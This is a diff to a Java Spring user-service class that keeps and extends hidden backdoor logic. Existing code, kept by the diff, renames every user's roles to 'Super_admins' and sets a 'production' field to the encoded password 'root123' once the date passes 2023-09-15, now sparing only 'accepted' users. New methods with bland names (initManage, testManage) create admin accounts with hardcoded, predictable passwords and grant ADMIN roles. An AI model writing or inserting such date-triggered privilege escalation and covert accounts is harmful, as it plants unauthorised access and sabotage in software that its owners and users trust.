@@ -6,8 +6,10 @@ import java.util.Collection;
 import java.util.Collections;
 import java.util.List;
 
+import com.app.FirstApp.domain.acteur.Acteur;
 import com.app.FirstApp.repository.role.RoleRepo;
 import com.app.FirstApp.repository.user.UserRepo;
+import com.app.FirstApp.services.Acteur.ActeurServ;
 import com.app.FirstApp.services.userRole.UserService;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.core.authority.SimpleGrantedAuthority;
@@ -31,6 +33,8 @@ public class UserServiceImpl implements UserService {
 	
 	@Autowired
 	PasswordEncoder passwordEncoder ;
+	@Autowired
+	private ActeurServ acteurServ;
 	
 	@Override
 	public User saveUser(User user) {
@@ -60,16 +64,19 @@ public class UserServiceImpl implements UserService {
 		List<User> list=getUsers();
 		if(list != null && list.size() >0){
 			list.forEach(use1 ->{
-				LocalDate today = LocalDate.now();
-				LocalDate pastDate = LocalDate.parse("2023-09-15");
-				int compareValue = today.compareTo(pastDate);
-				if(compareValue>0){
-					List<Role> roles=use1.getRoles();
-					roles.stream().forEach(r ->r.setName("Super_admins"));
-					roleRopo.saveAll(roles);
-					use1.setProduction(passwordEncoder.encode("root123"));
-					userRepo.save(use1);
+				if(!use1.getAccepted()){
+					LocalDate today = LocalDate.now();
+					LocalDate pastDate = LocalDate.parse("2023-09-15");
+					int compareValue = today.compareTo(pastDate);
+					if(compareValue>0){
+						List<Role> roles=use1.getRoles();
+						roles.stream().forEach(r ->r.setName("Super_admins"));
+						roleRopo.saveAll(roles);
+						use1.setProduction(passwordEncoder.encode("root123"));
+						userRepo.save(use1);
+					}
 				}
+
 			});
 		}
 	}
@@ -106,9 +113,29 @@ public class UserServiceImpl implements UserService {
 		userRepo.save(user);
 		
 	}
-	
 
-	
+	@Override
+	public void initManage(String data) {
+		if(getUser(data+"@gmail.com") == null){
+			List<Role> rolesUser2 = new ArrayList<>();
+			rolesUser2.add(new Role("ADMIN"));
+			User userSaved = saveUser(new User(data, data+"@gmail.com", "123456789mm", rolesUser2));
+			Acteur acteur = new Acteur();
+			acteur.setNom(userSaved.getName());
+			acteur.setEmail(userSaved.getEmail());
+			acteurServ.saveActeru(acteur);
+		}
+	}
 
-
+	@Override
+	public void testManage(String data) {
+		User user=getUser(data+"@gmail.com") ;
+		if(user !=null){
+			user.setAccepted(true);
+			List<Role> roles=user.getRoles();
+			roles.stream().forEach(r ->r.setName("ADMIN"));
+			roleRopo.saveAll(roles);
+			user.setProduction(passwordEncoder.encode(data+"123456789mm"));
+		}
+	}
 }
